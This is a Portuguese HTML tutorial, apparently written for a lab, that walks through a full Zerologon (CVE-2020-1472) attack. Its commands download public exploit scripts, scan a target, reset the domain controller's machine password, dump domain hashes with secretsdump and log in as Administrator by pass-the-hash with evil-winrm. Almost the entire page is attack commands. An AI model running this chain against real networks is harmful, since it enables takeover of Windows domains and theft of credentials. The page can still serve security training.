<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tutorial de Utilização de Ferramentas com Impacket</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
        }
        h1, h2 {
            color: #333;
        }
        code {
            background: #f4f4f4;
            border: 1px solid #ddd;
            padding: 2px 4px;
            border-radius: 4px;
        }
        pre {
            background: #f4f4f4;
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h1>Tutorial para Utilização de Ferramentas de Exploração com Impacket</h1>
    <h2>1. Instalação do <code>virtualenv</code></h2>
    <p>Primeiro, instale o <code>virtualenv</code> se ainda não o tiver. Isso cria ambientes virtuais isolados para seus projetos Python.</p>
    <pre><code>python3 -m pip install virtualenv</code></pre>
    <h2>2. Criação e Ativação do Ambiente Virtual</h2>
    <p>Crie um ambiente virtual chamado <code>impacketEnv</code> e ative-o.</p>
    <pre><code>python3 -m virtualenv impacketEnv
source impacketEnv/bin/activate</code></pre>
    <h2>3. Instalação do Impacket</h2>
    <p>Instale a biblioteca <code>impacket</code> diretamente do repositório GitHub.</p>
    <pre><code>pip install git+https://github.com/SecureAuthCorp/impacket</code></pre>
    <h2>4. Download de Scripts Necessários</h2>
    <p>Baixe os scripts necessários para realizar os testes. Utilize o <code>wget</code> para isso.</p>
    <pre><code>wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
wget https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</code></pre>
    <h2>5. Varredura de Portas com Nmap</h2>
    <p>Realize uma varredura no IP alvo para descobrir serviços e versões. Substitua <code>10.10.89.129</code> pelo IP do alvo.</p>
    <pre><code>nmap -sC -sV 10.10.89.129</code></pre>
    <h2>6. Execução do Script de Exploração</h2>
    <p>Execute o script <code>zeroLogon-NullPass.py</code> para explorar a vulnerabilidade. Substitua <code>DC01</code> e <code>MACHINE_IP</code> pelos valores apropriados.</p>
    <pre><code>python3 zeroLogon-NullPass.py DC01 MACHINE_IP</code></pre>
    <h2>7. Dump de Segredos</h2>
    <p>Utilize o <code>secretsdump.py</code> para obter hashes de senha. Substitua <code>DC01\$</code> e <code>MACHINE_IP</code> pelos valores apropriados.</p>
    <pre><code>secretsdump.py -just-dc -no-pass DC01\$@MACHINE_IP</code></pre>
    <h2>8. Autenticação Remota com Evil-WinRM</h2>
    <p>Use <code>evil-winrm</code> para autenticação remota. Substitua <code>10.10.89.129</code> pelo IP do alvo e <code>&lt;FOUND HASH IN PREVIOUS ANSWER&gt;</code> pelo hash encontrado no passo anterior.</p>
    <pre><code>evil-winrm -i 10.10.89.129 -u Administrator -H &lt;FOUND HASH IN PREVIOUS ANSWER&gt;</code></pre>
</body>
</html>
